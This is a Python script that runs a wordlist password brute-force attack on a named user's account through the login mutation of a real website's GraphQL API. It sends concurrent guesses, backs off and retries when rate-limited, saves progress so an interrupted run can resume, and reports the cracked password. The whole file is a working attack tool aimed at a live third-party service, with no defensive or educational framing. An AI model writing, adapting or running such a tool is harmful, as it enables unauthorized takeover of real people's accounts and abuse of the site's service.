#!/usr/bin/env python3
import asyncio
import aiohttp
import sys
import time
import os

URL = "https://api.joyreactor.cc/graphql"
QUERY = """
mutation Login($name: String!, $password: String!) {
  login(name: $name, password: $password) {
    me { id username }
  }
}
"""

found = asyncio.Event()
result = {"password": None}
stats = {"tried": 0, "start": 0}


def progress_file(wordlist_path):
    return wordlist_path + ".progress"


def load_progress(wordlist_path):
    pf = progress_file(wordlist_path)
    if os.path.exists(pf):
        with open(pf) as f:
            val = f.read().strip()
            if val.isdigit():
                return int(val)
    return 0


def save_progress(wordlist_path, index):
    with open(progress_file(wordlist_path), "w") as f:
        f.write(str(index))


async def try_login(session, username, password, semaphore, retries=3):
    if found.is_set():
        return

    payload = {"query": QUERY, "variables": {"name": username, "password": password}}

    async with semaphore:
        for attempt in range(retries):
            try:
                async with session.post(URL, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status == 503:
                        wait = 2 ** attempt
                        print(f"[!] 503 on {password!r}, retry {attempt+1}/{retries} in {wait}s")
                        await asyncio.sleep(wait)
                        continue

                    data = await r.json()
                    stats["tried"] += 1

                    if "errors" not in data:
                        result["password"] = password
                        found.set()
                        print(f"\n[+] SUCCESS! password={password!r}")
                        print(f"[+] Response: {data}")
                    elif stats["tried"] % 500 == 0:
                        elapsed = time.time() - stats["start"]
                        rps = stats["tried"] / elapsed
                        print(f"[-] {stats['tried']} tried | {rps:.1f} req/s | last: {password!r}")
                    return

            except Exception as e:
                if attempt < retries - 1:
                    await asyncio.sleep(2 ** attempt)
                else:
                    print(f"[!] Failed on {password!r}: {e}")


async def bruteforce(username, wordlist_path, workers=5):
    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    resume_from = load_progress(wordlist_path)
    if resume_from > 0:
        print(f"[*] Resuming from index {resume_from:,} ({passwords[resume_from]!r})")
        passwords = passwords[resume_from:]

    print(f"[*] Target:   {username}")
    print(f"[*] Wordlist: {len(passwords):,} passwords remaining")
    print(f"[*] Workers:  {workers} concurrent requests\n")

    semaphore = asyncio.Semaphore(workers)
    stats["start"] = time.time()

    connector = aiohttp.TCPConnector(limit=workers)
    headers = {"Content-Type": "application/json"}

    chunk_size = 100
    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        for i in range(0, len(passwords), chunk_size):
            if found.is_set():
                break
            chunk = passwords[i:i + chunk_size]
            tasks = [
                asyncio.create_task(try_login(session, username, pwd, semaphore))
                for pwd in chunk
            ]
            await asyncio.gather(*tasks)
            save_progress(wordlist_path, resume_from + i + len(chunk))

    elapsed = time.time() - stats["start"]
    if result["password"]:
        print(f"\n[+] Found in {elapsed:.1f}s after {stats['tried']:,} attempts")
        os.remove(progress_file(wordlist_path))
    else:
        print(f"\n[-] Not found. Tried {stats['tried']:,} passwords in {elapsed:.1f}s")
        print(f"[*] Progress saved. Run again to resume.")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <username> <wordlist> [workers=5]")
        print(f"       Resume: just run the same command again")
        sys.exit(1)

    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    asyncio.run(bruteforce(sys.argv[1], sys.argv[2], workers))
